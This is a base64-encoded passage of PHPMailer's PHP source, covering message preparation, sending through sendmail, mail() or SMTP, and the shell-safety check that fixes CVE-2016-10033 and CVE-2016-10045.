CAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFByZXBhcmUgYSBtZXNzYWdlIGZvciBzZW5kaW5nLgogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJlU2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50ID0gMDsgLy8gUmVzZXQgZXJyb3JzCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7CgogICAgICAgICAgICAvLyBEZXF1ZXVlIHJlY2lwaWVudCBhbmQgUmVwbHktVG8gYWRkcmVzc2VzIHdpdGggSUROCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X21lcmdlKCR0aGlzLT5SZWNpcGllbnRzUXVldWUsICR0aGlzLT5SZXBseVRvUXVldWUpIGFzICRwYXJhbXMpIHsKICAgICAgICAgICAgICAgICRwYXJhbXNbMV0gPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHBhcmFtc1sxXSk7CiAgICAgICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgkdGhpcywgJ2FkZEFuQWRkcmVzcycpLCAkcGFyYW1zKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT50bykgKyBjb3VudCgkdGhpcy0+Y2MpICsgY291bnQoJHRoaXMtPmJjYykpIDwgMSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygncHJvdmlkZV9hZGRyZXNzJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvLyBWYWxpZGF0ZSBGcm9tLCBTZW5kZXIsIGFuZCBDb25maXJtUmVhZGluZ1RvIGFkZHJlc3NlcwogICAgICAgICAgICBmb3JlYWNoIChhcnJheSgnRnJvbScsICdTZW5kZXInLCAnQ29uZmlybVJlYWRpbmdUbycpIGFzICRhZGRyZXNzX2tpbmQpIHsKICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gdHJpbSgkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAnIChwdW55RW5jb2RlKSAnIC4gJHRoaXMtPiRhZGRyZXNzX2tpbmQ7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gU2V0IHdoZXRoZXIgdGhlIG1lc3NhZ2UgaXMgbXVsdGlwYXJ0L2FsdGVybmF0aXZlCiAgICAgICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5zZXRNZXNzYWdlVHlwZSgpOwogICAgICAgICAgICAvLyBSZWZ1c2UgdG8gc2VuZCBhbiBlbXB0eSBtZXNzYWdlIHVubGVzcyB3ZSBhcmUgc3BlY2lmaWNhbGx5IGFsbG93aW5nIGl0CiAgICAgICAgICAgIGlmICghJHRoaXMtPkFsbG93RW1wdHkgYW5kIGVtcHR5KCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW1wdHlfbWVzc2FnZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gQ3JlYXRlIGJvZHkgYmVmb3JlIGhlYWRlcnMgaW4gY2FzZSBib2R5IG1ha2VzIGNoYW5nZXMgdG8gaGVhZGVycyAoZS5nLiBhbHRlcmluZyB0cmFuc2ZlciBlbmNvZGluZykKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsKICAgICAgICAgICAgLy8gY3JlYXRlQm9keSBtYXkgaGF2ZSBhZGRlZCBzb21lIGhlYWRlcnMsIHNvIHJldGFpbiB0aGVtCiAgICAgICAgICAgICR0ZW1waGVhZGVycyA9ICR0aGlzLT5NSU1FSGVhZGVyOwogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICR0aGlzLT5jcmVhdGVIZWFkZXIoKTsKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHRlbXBoZWFkZXJzOwoKICAgICAgICAgICAgLy8gVG8gY2FwdHVyZSB0aGUgY29tcGxldGUgbWVzc2FnZSB3aGVuIHVzaW5nIG1haWwoKSwgY3JlYXRlCiAgICAgICAgICAgIC8vIGFuIGV4dHJhIGhlYWRlciBsaXN0IHdoaWNoIGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbgogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpIHsKICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgICAgICdTdWJqZWN0JywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIodHJpbSgkdGhpcy0+U3ViamVjdCkpKQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gU2lnbiB3aXRoIERLSU0gaWYgZW5hYmxlZAogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5ES0lNX2RvbWFpbikKICAgICAgICAgICAgICAgIGFuZCAhZW1wdHkoJHRoaXMtPkRLSU1fc2VsZWN0b3IpCiAgICAgICAgICAgICAgICBhbmQgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZykKICAgICAgICAgICAgICAgICAgICBvciAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHRoaXMtPkRLSU1fcHJpdmF0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgYW5kIGZpbGVfZXhpc3RzKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSA9ICR0aGlzLT5ES0lNX0FkZCgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIsICIKICIpIC4gc2VsZjo6Q1JMRiAuCiAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoIgoiLCAiCiIsICRoZWFkZXJfZGtpbSkgLiBzZWxmOjpDUkxGOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEFjdHVhbGx5IHNlbmQgYSBtZXNzYWdlLgogICAgICogU2VuZCB0aGUgZW1haWwgdmlhIHRoZSBzZWxlY3RlZCBtZWNoYW5pc20KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHBvc3RTZW5kKCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICAvLyBDaG9vc2UgdGhlIG1haWxlciBhbmQgc2VuZCB0aHJvdWdoIGl0CiAgICAgICAgICAgIHN3aXRjaCAoJHRoaXMtPk1haWxlcikgewogICAgICAgICAgICAgICAgY2FzZSAnc2VuZG1haWwnOgogICAgICAgICAgICAgICAgY2FzZSAncW1haWwnOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VuZG1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgY2FzZSAnc210cCc6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGNhc2UgJ21haWwnOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgICAgICRzZW5kTWV0aG9kID0gJHRoaXMtPk1haWxlci4nU2VuZCc7CiAgICAgICAgICAgICAgICAgICAgaWYgKG1ldGhvZF9leGlzdHMoJHRoaXMsICRzZW5kTWV0aG9kKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPiRzZW5kTWV0aG9kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1haWwgdXNpbmcgdGhlICRTZW5kbWFpbCBwcm9ncmFtLgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRTZW5kbWFpbAogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkKICAgIHsKICAgICAgICAvLyBDVkUtMjAxNi0xMDAzMywgQ1ZFLTIwMTYtMTAwNDU6IERvbid0IHBhc3MgLWYgaWYgY2hhcmFjdGVycyB3aWxsIGJlIGVzY2FwZWQuCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1mJXMnOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtZiVzIC10JzsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcpIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLW9pIC10JzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLy8gVE9ETzogSWYgcG9zc2libGUsIHRoaXMgc2hvdWxkIGJlIGNoYW5nZWQgdG8gZXNjYXBlc2hlbGxhcmcuICBOZWVkcyB0aG9yb3VnaCB0ZXN0aW5nLgogICAgICAgICRzZW5kbWFpbCA9IHNwcmludGYoJHNlbmRtYWlsRm10LCBlc2NhcGVzaGVsbGNtZCgkdGhpcy0+U2VuZG1haWwpLCAkdGhpcy0+U2VuZGVyKTsKCiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbykgewogICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+U2luZ2xlVG9BcnJheSBhcyAkdG9BZGRyKSB7CiAgICAgICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJ1RvOiAnIC4gJHRvQWRkciAuICIKIik7CiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOwogICAgICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygKICAgICAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwKICAgICAgICAgICAgICAgICAgICBhcnJheSgkdG9BZGRyKSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y2MsCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmJjYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICAgICAkYm9keSwKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0ICE9IDApIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZnB1dHMoJG1haWwsICRoZWFkZXIpOwogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOwogICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwKICAgICAgICAgICAgICAgICR0aGlzLT50bywKICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsCiAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgJHRoaXMtPkZyb20KICAgICAgICAgICAgKTsKICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gMCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEZpeCBDVkUtMjAxNi0xMDAzMyBhbmQgQ1ZFLTIwMTYtMTAwNDUgYnkgZGlzYWxsb3dpbmcgcG90ZW50aWFsbHkgdW5zYWZlIHNoZWxsIGNoYXJhY3RlcnMuCiAgICAgKgogICAgICogTm90ZSB0aGF0IGVzY2FwZXNoZWxsYXJnIGFuZCBlc2NhcGVzaGVsbGNtZCBhcmUgaW5hZGVxdWF0ZSBmb3Igb3VyIHB1cnBvc2VzLCBlc3BlY2lhbGx5IG9uIFdpbmRvd3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIHN0cmluZyB0byBiZSB2YWxpZGF0ZWQKICAgICAqIEBzZWUgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvaXNzdWVzLzkyNCBDVkUtMjAxNi0xMDA0NSBidWcgcmVwb3J0CiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gaXNTaGVsbFNhZmUoJHN0cmluZykKICAgIHsKICAgICAgICAvLyBGdXR1cmUtcHJvb2YKICAgICAgICBpZiAoZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcKICAgICAgICAgICAgb3IgIWluX2FycmF5KGVzY2FwZXNoZWxsYXJnKCRzdHJpbmcpLCBhcnJheSgiJyRzdHJpbmcnIiwgIlwiJHN0cmluZ1wiIikpCiAgICAgICAgKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJHN0cmluZyk7CgogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAgICAgJGMgPSAkc3RyaW5nWyRpXTsKCiAgICAgICAgICAgIC8vIEFsbCBvdGhlciBjaGFyYWN0ZXJzIGhhdmUgYSBzcGVjaWFsIG1lYW5pbmcgaW4gYXQgbGVhc3Qgb25lIGNvbW1vbiBzaGVsbCwgaW5jbHVkaW5nID0gYW5kICsuCiAgICAgICAgICAgIC8vIEZ1bGwgc3RvcCAoLikgaGFzIGEgc3BlY2lhbCBtZWFuaW5nIGluIGNtZC5leGUsIGJ1dCBpdHMgaW1wYWN0IHNob3VsZCBiZSBuZWdsaWdpYmxlIGhlcmUuCiAgICAgICAgICAgIC8vIE5vdGUgdGhhdCB0aGlzIGRvZXMgcGVybWl0IG5vbi1MYXRpbiBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyBiYXNlZCBvbiB0aGUgY3VycmVudCBsb2NhbGUuCiAgICAgICAgICAgIGlmICghY3R5cGVfYWxudW0oJGMpICYmIHN0cnBvcygnQF8tLicsICRjKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayB3aGV0aGVyIGEgZmlsZSBwYXRoIGlzIG9mIGEgcGVybWl0dGVkIHR5cGUuCiAgICAgKiBVc2VkIHRvIHJlamVjdCBVUkxzIGFuZCBwaGFyIGZpbGVzIGZyb20gZnVuY3Rpb25zIHRoYXQgYWNjZXNzIGxvY2FsIGZpbGUgcGF0aHMsCiAgICAgKiBzdWNoIGFzIGFkZEF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgcmVsYXRpdmUgb3IgYWJzb2x1dGUgcGF0aCB0byBhIGZpbGUuCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1Blcm1pdHRlZFBhdGgoJHBhdGgpCiAgICB7CiAgICAgICAgcmV0dXJuICFwcmVnX21hdGNoKCcjXlthLXpdKzovLyNpJywgJHBhdGgpOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSBQSFAgbWFpbCgpIGZ1bmN0aW9uLgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9ib29rLm1haWwucGhwCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJHRvQXJyID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgewogICAgICAgICAgICAkdG9BcnJbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOwogICAgICAgIH0KICAgICAgICAkdG8gPSBpbXBsb2RlKCcsICcsICR0b0Fycik7CgogICAgICAgICRwYXJhbXMgPSBudWxsOwogICAgICAgIC8vVGhpcyBzZXRzIHRoZSBTTVRQIGVudmVsb3BlIHNlbmRlciB3aGljaCBnZXRzIHR1cm5lZCBpbnRvIGEgcmV0dXJuLXBhdGggaGVhZGVyIGJ5IHRoZSByZWNlaXZlcgogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgogICAgICAgICAgICBpZiAoc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgIWluaV9nZXQoJ3NhZmVfbW9kZScpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsKICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR0aGlzLT5TZW5kZXIpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0ID0gZmFsc2U7CiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbyBhbmQgY291bnQoJHRvQXJyKSA+IDEpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRvQXJyIGFzICR0b0FkZHIpIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0b0FkZHIsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCBhcnJheSgkdG9BZGRyKSwgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0bywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgJHRoaXMtPnRvLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOwogICAgICAgIH0KICAgICAgICBpZiAoaXNzZXQoJG9sZF9mcm9tKSkgewogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJG9sZF9mcm9tKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkcmVzdWx0KSB7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2luc3RhbnRpYXRlJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCBhbiBpbnN0YW5jZSB0byB1c2UgZm9yIFNNVFAgb3BlcmF0aW9ucy4KICAgICAqIE92ZXJyaWRlIHRoaXMgZnVuY3Rpb24gdG8gbG9hZCB5b3VyIG93biBTTVRQIGltcGxlbWVudGF0aW9uCiAgICAgKiBAcmV0dXJuIFNNVFAKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNNVFBJbnN0YW5jZSgpCiAgICB7CiAgICAgICAgaWYgKCFpc19vYmplY3QoJHRoaXMtPnNtdHApKSB7CiAgICAgICAgICAgICR0aGlzLT5zbXRwID0gbmV3IFNNVFA7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+c210cDsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB2aWEgU01UUC4KICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlcmUgaXMgYSBiYWQgTUFJTCBGUk9NLCBSQ1BULCBvciBEQVRBIGlucHV0LgogICAgICogVXNlcyB0aGUgUEhQTWFpbGVyU01UUCBjbGFzcyBieSBkZWZhdWx0LgogICAgICogQHNlZSBQSFBNYWlsZXI6OmdldFNNVFBJbnN0YW5jZSgpIHRvIHVzZSBhIGRpZmZlcmVudCB